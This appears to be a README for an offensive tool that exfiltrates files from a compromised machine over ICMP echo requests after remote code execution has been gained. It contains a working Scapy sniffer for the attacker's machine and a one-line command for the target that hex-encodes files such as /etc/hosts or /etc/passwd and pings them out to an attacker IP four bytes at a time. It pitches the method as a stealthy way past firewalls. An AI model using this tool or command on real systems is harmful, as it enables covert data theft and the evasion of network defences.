# **ICMP Sniffer for Data Exfiltration**

This tool demonstrates a method to **exfiltrate data** from a vulnerable machine using **Remote Code Execution (RCE)** via **ICMP ping packets**. It's designed for scenarios where establishing a reverse shell or listing directories isn't possible. Instead, it allows the transfer of file contents over **ICMP Echo Requests**.

## **Overview**

When **RCE** is available on a target system (whether through a **web shell**, direct command execution, or any other form of **RCE**), but network restrictions prevent the use of common exfiltration methods like reverse shells, this tool helps **exfiltrate sensitive data** by transferring it through **ICMP packets**.

## **How It Works**

- **On the Target Machine**:
    - When you have **RCE** access (via a **web shell** or any method), run a command to **convert a file** (e.g., `/etc/hosts`, `/etc/passwd`) into **hexadecimal format** and send the content **4 bytes at a time** via **ICMP ping packets**.

- **On the Attacker Machine**:
    - Use the **ICMP Sniffer script** to listen for incoming **ping requests** and extract the file contents.
    
This method bypasses traditional firewall rules and can **exfiltrate data in a stealthy manner**.

## **Requirements**

- Python 3.x
- Scapy library
- Root privileges (to sniff ICMP packets)

## **Usage**

### 1. **icmp_sniffer.py**

This Python script listens for **ICMP Echo Requests** and extracts the data sent within them.

```python
#!/usr/bin/python3

from scapy.all import *
import signal, sys, time

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C handler
signal.signal(signal.SIGINT, def_handler)

def data_parser(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            data = packet[ICMP].load[-4:].decode("utf-8")
            print(data, flush=True, end='')

if __name__ == '__main__':
    sniff(iface='tun0', prn=data_parser)  # Change "tun0" if needed
```
### 2. **Command for the Target Machine**
Run the following on the target machine (with RCE access, such as through a web shell or another method) to exfiltrate the contents of a file via ICMP:

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attacker_ip>; done
```

### 3. **Run the Sniffer**
On the attacker's machine, use the **icmp_sniffer.py** to listen for the incoming ICMP packets:

```bash
sudo python3 icmp_sniffer.py
```
You will see the contents of the file printed on your terminal as it is exfiltrated.
